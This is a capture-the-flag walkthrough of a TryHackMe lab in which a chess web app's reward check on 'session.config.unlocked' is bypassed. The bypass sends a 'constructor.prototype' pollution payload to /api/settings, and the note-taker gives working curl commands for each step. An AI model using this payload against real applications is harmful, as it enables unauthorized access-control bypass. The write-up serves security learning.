# TryHackMe — Prototype Pollution Chess

A walkthrough of the complete attack path for the vulnerable chess application: web reconnaissance, HTTP inspection with Burp Suite, identifying an authorization check, exploiting prototype pollution via a settings endpoint, and abusing the JavaScript prototype chain to bypass the reward restriction.

**Difficulty:** Medium
**Machine IP:** `10.113.188.132:3000`

---

## Overview

The room involves:

- Web application reconnaissance
- HTTP request inspection with Burp Suite
- Identification of an authorization check
- Prototype pollution through a vulnerable settings endpoint
- Abuse of JavaScript's prototype chain to bypass the reward restriction

After identifying that the reward is controlled by `session.config.unlocked`, prototype pollution is exploited through `/api/settings` using a `constructor.prototype` payload.

---

## 1. Web Application Enumeration

Visited the target application:

```
http://10.113.188.132:3000/
```

The application presented a chess game with the following functionality:

- Resetting the chess position
- Making chess moves
- Saving game preferences/settings

The game appeared to be designed around a specific move sequence, similar to Fool's Mate.

Rather than immediately trying to exploit the game logic itself, the next step was to understand how the application communicated with the backend — Burp Suite was used to intercept HTTP requests.

---

## 2. API Enumeration

While interacting with the application, several relevant API endpoints were identified:

| Endpoint | Purpose |
|---|---|
| `POST /api/settings` | Processes user game preferences |
| `POST /api/move` | Handles chess moves |
| `POST /api/reset` | Resets the game state |

Normal application functionality was exercised while observing the corresponding requests in Burp Suite.

---

## 3. Testing the Chess Logic

The intended Fool's Mate–style move sequence was repeated, and checkmate was achieved via `POST /api/move`.

However, despite achieving checkmate, **the application did not provide the expected reward**. The server response revealed the cause:

> The reward was being blocked because `session.config.unlocked` was not set.

This indicated that checkmate alone was insufficient — an additional server-side authorization/state check controlled whether the reward could be returned. `session.config.unlocked` became the primary target.

---

## 4. Resetting the Game

Since the game had ended after the checkmate, the game state was reset via:

```
POST /api/reset
```

This returned the application to its initial state, allowing further testing without interference from the previous game.

---

## 5. Identifying Prototype Pollution

The next step was investigating how the application handled JSON submitted to `/api/settings`. Since the endpoint accepted user-controlled JSON, prototype pollution was worth testing.

### Background

In JavaScript, objects inherit properties through their prototype chain. If an object does not contain a property itself, JavaScript looks for that property on its prototype:

```
session.config
      │
      ▼
Object.prototype
      │
      └── unlocked: true
```

If `session.config` has no own `unlocked` property, `session.config.unlocked` can resolve via `Object.prototype`.

This becomes dangerous when an application merges attacker-controlled JSON into objects without filtering dangerous keys such as:

- `__proto__`
- `constructor`
- `prototype`

These can be abused to manipulate the shared JavaScript prototype chain.

---

## 6. Testing `/api/settings`

The endpoint normally accepts standard game settings. A `constructor.prototype` structure was appended alongside legitimate settings:

```json
"constructor": {
  "prototype": {
    "unlocked": true
  }
}
```

**Full request body used for testing:**

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180,
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  }
}
```

The request was accepted — indicating the application merges the supplied object into another JavaScript object without safely handling `constructor`/`prototype` keys.

---

## 7. Prototype Pollution

The vulnerable merge behavior allowed the payload to modify the shared prototype, effectively producing:

```js
Object.prototype.unlocked = true
```

Critically, `session.config.unlocked` was never modified directly. Instead, the shared prototype inherited by ordinary objects was polluted. Since `session.config` is a normal object without its own `unlocked` property, the lookup resolves up the chain:

```
session.config
     │
     │ property not found
     ▼
Object.prototype
     │
     │ unlocked = true
     ▼
    true
```

This turns the previously blocked reward condition into a satisfied one.

---

## 8. Triggering the Reward

With the prototype polluted, the checkmate sequence was performed again via `POST /api/move`, using the **same session**.

When the server checked `session.config.unlocked`, the property resolved to `true` through the polluted prototype chain. The application considered the session unlocked, the checkmate was accepted, and the reward/flag was returned.

### Exploitation Chain

```
Chess Application
      │
      ▼
Burp Suite Request Inspection
      │
      ▼
POST /api/move
      │
      ▼
Reward blocked by session.config.unlocked
      │
      ▼
Investigate /api/settings
      │
      ▼
constructor.prototype payload
      │
      ▼
Object.prototype.unlocked = true
      │
      ▼
session.config.unlocked resolves to true
      │
      ▼
Checkmate
      │
      ▼
Reward / Flag
```

---

## 9. Recreating the Exploit with cURL

After confirming the vulnerability via Burp Suite, the attack was recreated with cURL, using a cookie jar to persist the session across the reset, pollution, and move requests.

```bash
target=10.113.188.132:3000
```

### Step 1 — Reset the Session

`-c` saves cookies to `cookies.txt`; `-b` sends cookies from that file.

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://$target/api/reset \
  -H "Content-Length: 0" >/dev/null
```

This establishes a clean game state and the cookie jar reused in later steps.

### Step 2 — Pollute the Prototype

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://$target/api/settings \
  -H "Content-Type: application/json" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}'
```

Key payload:

```json
"constructor": {
  "prototype": {
    "unlocked": true
  }
}
```

This exploits the vulnerable object merge, polluting `Object.prototype` with `unlocked: true` — which affects any object (including `session.config`) that doesn't explicitly define its own `unlocked` property.

### Step 3 — Perform the Checkmate Move

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://$target/api/move \
  -H "Content-Type: application/json" \
  -d '{"from":"a1","to":"a8"}'
```

The server evaluates the move, then checks the reward condition:

| Stage | `session.config.unlocked` |
|---|---|
| Before pollution | Unset |
| After pollution | `true` (inherited via `Object.prototype`) |

The application considers the reward unlocked and returns the flag.

---

## Final Exploitation Path

```
Web Application
      │
      ▼
Burp Suite
      │
      ▼
POST /api/move
      │
      ▼
Reward requires session.config.unlocked
      │
      ▼
Investigate POST /api/settings
      │
      ▼
constructor.prototype payload
      │
      ▼
Prototype Pollution
      │
      ▼
Object.prototype.unlocked = true
      │
      ▼
session.config.unlocked resolves to true
      │
      ▼
Checkmate
      │
      ▼
Flag
```

---

## Vulnerability Classification

- **Primary vulnerability:** Server-Side Prototype Pollution
- **Resulting impact:** Authorization / Access-Control Bypass
- **CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html) — Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

The vulnerable behavior occurs because attacker-controlled JSON containing prototype-related keys (`constructor`, `prototype`, `__proto__`) is accepted and merged without adequate sanitization:

```json
{
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  }
}
```

The core security issue is not the chess logic itself — the game simply provides the condition needed to reach the reward functionality. The actual vulnerability is the ability to manipulate the JavaScript prototype chain and make a security-sensitive property appear enabled.

---

## Summary

This room demonstrates how seemingly harmless JSON settings can become dangerous when merged into JavaScript objects without guarding against prototype pollution.

**Final chain:** `/api/settings` → `constructor.prototype` → `Object.prototype.unlocked = true` → `session.config.unlocked` → Authorization Bypass → Checkmate → **Flag**
